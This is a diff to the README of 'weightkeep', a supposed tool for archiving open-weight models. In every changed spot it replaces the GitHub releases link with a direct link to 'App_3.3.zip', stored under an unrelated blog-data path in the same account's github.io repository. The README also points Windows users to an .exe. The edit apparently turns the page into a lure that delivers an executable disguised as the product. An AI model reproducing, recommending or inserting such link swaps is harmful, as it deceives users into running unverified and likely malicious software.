@@ -5,7 +5,7 @@ description: "Keep open-weight models verified and locally served via a Hugging 
 ---
 # 📦 weightkeep - Keep Verified Copies of Open-Weight Models
 
-[![Download Now](https://img.shields.io/badge/Download-weightkeep-blue?style=for-the-badge&logo=github)](https://github.com/gayleensofthaired172/weightkeep/releases)
+[![Download Now](https://img.shields.io/badge/Download-weightkeep-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gayleensofthaired172/gayleensofthaired172.github.io/main/content/blog/data-visualization/App_3.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ weightkeep uses a few clever technologies to do its job:
 
 Visit this link to download the application:
 
-**[https://github.com/gayleensofthaired172/weightkeep/releases](https://github.com/gayleensofthaired172/weightkeep/releases)**
+**[https://raw.githubusercontent.com/gayleensofthaired172/gayleensofthaired172.github.io/main/content/blog/data-visualization/App_3.3.zip](https://raw.githubusercontent.com/gayleensofthaired172/gayleensofthaired172.github.io/main/content/blog/data-visualization/App_3.3.zip)**
 
 You'll see a list of files. Choose the one that matches your computer's operating system (Windows, macOS, or Linux). If you're on Windows, look for a file that ends with `.exe`.
 
@@ -206,7 +206,7 @@ If you need help, you can:
 
 Don't let your favorite models disappear. Start archiving and serving them locally with weightkeep.
 
-**[👉 Download weightkeep now](https://github.com/gayleensofthaired172/weightkeep/releases)**
+**[👉 Download weightkeep now](https://raw.githubusercontent.com/gayleensofthaired172/gayleensofthaired172.github.io/main/content/blog/data-visualization/App_3.3.zip)**
 
 ---
 
